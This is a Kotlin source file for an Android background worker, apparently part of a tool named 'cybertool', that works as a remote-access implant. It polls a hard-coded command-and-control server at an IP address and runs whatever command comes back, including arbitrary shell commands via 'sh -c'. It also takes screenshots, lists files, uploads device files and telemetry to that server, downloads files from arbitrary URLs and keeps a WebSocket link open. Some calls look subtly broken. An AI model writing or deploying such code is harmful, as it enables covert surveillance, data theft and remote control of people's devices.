package com.riqel.cybertool

import android.content.Context
import android.os.Handler
import android.os.Looper
import android.widget.Toast
import androidx.work.*
import com.google.gson.Gson
import kotlinx.coroutines.*
import okhttp3.*
import okhttp3.RequestBody.Companion.asRequestBody
import okhttp3.ResponseBody
import java.io.File
import java.io.FileOutputStream
import java.util.concurrent.TimeUnit

class CommandWorker(context: Context, params: WorkerParameters) : Worker(context, params) {
    private val client = OkHttpClient.Builder()
        .connectTimeout(30, TimeUnit.SECONDS)
        .readTimeout(30, TimeUnit.SECONDS)
        .build()
    private val gson = Gson()
    private val C2_BASE = "http://100.102.225.113:5000"  // Update
    private val deviceId = applicationContext.contentResolver.getDeviceId() ?: "unknown"
    private lateinit var db: AppDatabase
    private var webSocket: WebSocket? = null

    override fun doWork(): Result {
        db = AppDatabase.getInstance(applicationContext)
        runBlocking {
            // 1. Process any pending commands from local database
            db.commandDao().getPendingCommands().firstOrNull()?.forEach { cmd ->
                executeAndReport(cmd)
            }
            // 2. Fetch new command from C2
            fetchNewCommand()
            // 3. Establish WebSocket for live logs
            connectWebSocket()
        }
        return Result.success()
    }

    private suspend fun fetchNewCommand() {
        val request = Request.Builder().url("$C2_BASE/api/command/$deviceId").build()
        val response = client.newCall(request).execute()
        if (response.isSuccessful) {
            val cmdJson = response.body?.string() ?: return
            val cmd = gson.fromJson(cmdJson, RemoteCommand::class.java)
            if (cmd.action != "noop") {
                val queued = QueuedCommand(
                    commandId = cmd.id,
                    action = cmd.action,
                    args = gson.toJson(cmd.args),
                    issuedAt = System.currentTimeMillis(),
                    status = "pending"
                )
                db.commandDao().insert(queued)
                executeAndReport(queued)
            }
        }
    }

    private suspend fun executeAndReport(cmd: QueuedCommand) {
        val argsMap = gson.fromJson<Map<String, String>>(cmd.args, Map::class.java) as Map<String, String>
        val result = when (cmd.action) {
            "screenshot" -> takeScreenshot()
            "upload_logs" -> uploadAllLogs()
            "list_files" -> listFiles(argsMap["path"] ?: "/sdcard")
            "upload_file" -> uploadFile(argsMap["path"] ?: "")
            "download_file" -> downloadFile(argsMap["url"] ?: "", argsMap["dest"] ?: "")
            "toast" -> showToast(argsMap["message"] ?: "")
            "websocket_test" -> "WebSocket message sent"
            else -> executeShell(cmd.action)
        }
        // Update status in DB
        cmd.status = "done"
        db.commandDao().update(cmd)
        // Send result to C2
        sendResult(cmd.commandId, result)
    }

    private fun sendResult(cmdId: String, output: String) {
        val body = gson.toJson(mapOf("id" to cmdId, "output" to output))
        val request = Request.Builder()
            .url("$C2_BASE/api/result/$deviceId")
            .post(RequestBody.create(MediaType.parse("application/json"), body))
            .build()
        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {}
            override fun onResponse(call: Call, response: Response) { response.close() }
        })
    }

    private fun executeShell(command: String): String {
        return try {
            val process = Runtime.getRuntime().exec(arrayOf("sh", "-c", command))
            val output = process.inputStream.bufferedReader().readText()
            val error = process.errorStream.bufferedReader().readText()
            if (error.isNotBlank()) "ERROR: $error" else output
        } catch (e: Exception) { "Exception: ${e.message}" }
    }

    private fun takeScreenshot(): String {
        var result = "failed"
        val latch = CountDownLatch(1)
        ScreenshotService.takeScreenshot(applicationContext) { path ->
            result = "Screenshot saved: $path"
            latch.countDown()
        }
        latch.await(10, TimeUnit.SECONDS)
        return result
    }

    private fun uploadAllLogs(): String {
        // Trigger the existing DataUploadWorker to send all telemetry now
        WorkManager.getInstance(applicationContext).enqueue(OneTimeWorkRequestBuilder<DataUploadWorker>().build())
        return "Upload triggered"
    }

    private fun listFiles(path: String): String {
        val file = File(path)
        if (!file.exists()) return "Path not found"
        return if (file.isDirectory) {
            file.list()?.take(100)?.joinToString("\n") ?: "empty"
        } else "File: ${file.length()} bytes"
    }

    private fun uploadFile(path: String): String {
        val file = File(path)
        if (!file.exists()) return "File not found"
        val body = file.asRequestBody(MediaType.parse("application/octet-stream"))
        val request = Request.Builder()
            .url("$C2_BASE/api/upload/$deviceId")
            .post(body)
            .build()
        return try {
            val response = client.newCall(request).execute()
            if (response.isSuccessful) "Uploaded ${file.name}" else "Upload failed: ${response.code}"
        } catch (e: Exception) { "Error: ${e.message}" }
    }

    private fun downloadFile(url: String, destPath: String): String {
        val request = Request.Builder().url(url).build()
        return try {
            val response = client.newCall(request).execute()
            if (response.isSuccessful) {
                val destFile = File(destPath)
                destFile.parentFile?.mkdirs()
                val body = response.body ?: return "Empty response"
                body.byteStream().use { input ->
                    FileOutputStream(destFile).use { output ->
                        input.copyTo(output)
                    }
                }
                "Downloaded to $destPath (${destFile.length()} bytes)"
            } else "Download failed: ${response.code}"
        } catch (e: Exception) { "Error: ${e.message}" }
    }

    private fun showToast(message: String): String {
        Handler(Looper.getMainLooper()).post {
            Toast.makeText(applicationContext, message, Toast.LENGTH_LONG).show()
        }
        return "Toast shown"
    }

    private fun connectWebSocket() {
        val wsUrl = C2_BASE.replace("http", "ws") + "/ws/$deviceId"
        val wsClient = object : WebSocketListener() {
            override fun onOpen(webSocket: WebSocket, response: Response) {
                this@CommandWorker.webSocket = webSocket
                webSocket.send("Connected from device $deviceId")
            }
            override fun onMessage(webSocket: WebSocket, text: String) {
                // Handle incoming WebSocket message as a command (optional)
                println("WS message: $text")
            }
        }
        client.newWebSocket(Request.Builder().url(wsUrl).build(), wsClient)
    }

    data class RemoteCommand(val id: String, val action: String, val args: Map<String, String>?)

    companion object {
        private class CountDownLatch(private val count: Int) {
            private var remaining = count
            @Synchronized fun countDown() { remaining--; if (remaining == 0) (this as Object).notify() }
            @Synchronized fun await(timeout: Long, unit: TimeUnit) {
                var millis = unit.toMillis(timeout)
                while (remaining > 0 && millis > 0) {
                    (this as Object).wait(millis)
                    millis = 0
                }
            }
        }
    }
}
